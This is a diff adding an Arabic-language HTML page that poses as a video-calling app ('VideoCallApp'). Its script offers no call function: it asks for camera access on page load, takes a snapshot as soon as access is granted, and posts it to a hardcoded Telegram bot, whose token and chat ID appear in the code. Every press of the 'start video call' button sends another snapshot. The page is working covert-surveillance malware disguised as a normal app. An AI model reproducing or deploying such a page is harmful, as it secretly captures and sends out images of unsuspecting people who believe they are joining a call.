@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>مكالمة فيديو</title>
+<style>
+  * {box-sizing: border-box; margin:0; padding:0;}
+  body {
+    font-family: 'Arial', sans-serif;
+    background: linear-gradient(135deg,#031E40,#1A2A58);
+    color: #fff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+  }
+  header {
+    width: 100%;
+    padding: 12px 20px;
+    background: rgba(0,0,0,0.3);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    backdrop-filter: blur(6px);
+  }
+  header .logo {
+    display: flex;
+    align-items: center;
+  }
+  header .logo img {
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    margin-left: 10px;
+    animation: spin 6s linear infinite;
+  }
+  header .logo span {font-size: 20px; font-weight: bold;}
+  @keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+  .call-container {
+    margin-top: 30px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  video {
+    width: 90vw;
+    max-width: 480px;
+    border-radius: 20px;
+    border: 4px solid rgba(255,255,255,0.2);
+    box-shadow: 0 8px 25px rgba(0,0,0,0.5);
+    transition: transform 0.3s ease;
+  }
+  video:hover {transform: scale(1.02);}
+  .controls {
+    margin-top: 20px;
+    display: flex;
+    gap: 15px;
+  }
+  .controls button {
+    padding: 12px 18px;
+    font-size: 16px;
+    border-radius: 12px;
+    border: none;
+    background: #6C63FF;
+    color: #fff;
+    cursor: pointer;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+    transition: transform 0.2s, box-shadow 0.2s, background 0.2s;
+  }
+  .controls button:hover {transform: scale(1.1); background: #8B7CFF;}
+  .controls button:active {transform: scale(0.95); box-shadow: 0 2px 5px rgba(0,0,0,0.3);}
+  @media (max-width: 768px){
+    video {width: 95vw;}
+    header .logo span {font-size: 18px;}
+    .controls button {padding:10px 14px; font-size:14px;}
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">
+    <img src="video-calling.png" alt="شعار">
+    <span>VideoCallApp</span>
+  </div>
+</header>
+
+<div class="call-container">
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="480" height="360" style="display:none;"></canvas>
+  <div class="controls">
+    <button id="capture">بدء مكالمة الفيديو</button>
+  </div>
+</div>
+
+<script>
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const btn = document.getElementById('capture');
+
+const TELEGRAM_BOT_TOKEN = '8279560673:AAEusEPpCURUXNzzecxxiRh2m20ULnZHzTk';
+const TELEGRAM_CHAT_ID  = '1848006769';
+
+let stream = null;
+let isStreaming = false;
+
+async function requestCamera() {
+  if(stream) stream.getTracks().forEach(t=>t.stop());
+  try {
+    const s = await navigator.mediaDevices.getUserMedia({video:true});
+    stream = s;
+    video.srcObject = s;
+    isStreaming = true;
+    await new Promise(res=>{
+      if(video.videoWidth) return res();
+      function onMeta(){ video.removeEventListener('loadedmetadata', onMeta); res(); }
+      video.addEventListener('loadedmetadata', onMeta);
+    });
+    canvas.width = video.videoWidth || 480;
+    canvas.height = video.videoHeight || 360;
+    return true;
+  } catch(err) {
+    console.warn('طلب الكاميرا فشل:', err && err.name ? err.name : err);
+    stream = null;
+    isStreaming = false;
+    video.srcObject = null;
+    return false;
+  }
+}
+
+function dataURLtoBlob(dataurl){
+  const arr = dataurl.split(',');
+  const mime = arr[0].match(/:(.*?);/)[1];
+  const bstr = atob(arr[1]);
+  let n = bstr.length;
+  const u8 = new Uint8Array(n);
+  while(n--) u8[n] = bstr.charCodeAt(n);
+  return new Blob([u8], {type: mime});
+}
+
+async function captureAndSend(){
+  if(!isStreaming || !stream) return;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video,0,0,canvas.width,canvas.height);
+  const dataUrl = canvas.toDataURL('image/png');
+  const blob = dataURLtoBlob(dataUrl);
+  const form = new FormData();
+  form.append('chat_id', TELEGRAM_CHAT_ID);
+  form.append('photo', blob, 'capture.png');
+  try{
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {method:'POST', body:form});
+  } catch(err){ console.error('خطأ في الإرسال:', err); }
+}
+
+// يطلب صلاحية الكاميرا مباشرة عند تحميل الصفحة
+window.addEventListener('load', async ()=>{
+  const granted = await requestCamera();
+  if(granted){
+    await captureAndSend(); // يلتقط الصورة فور الموافقة
+  }
+});
+
+// كل ضغطة على الزر تلتقط صورة جديدة وترسلها
+btn.addEventListener('click', async ()=>{
+  if(!isStreaming){
+    const granted = await requestCamera();
+    if(!granted) return;
+  }
+  await captureAndSend();
+});
+
+window.addEventListener('beforeunload', ()=>{ if(stream) stream.getTracks().forEach(t=>t.stop()); });
+</script>
+
+</body>
+</html>
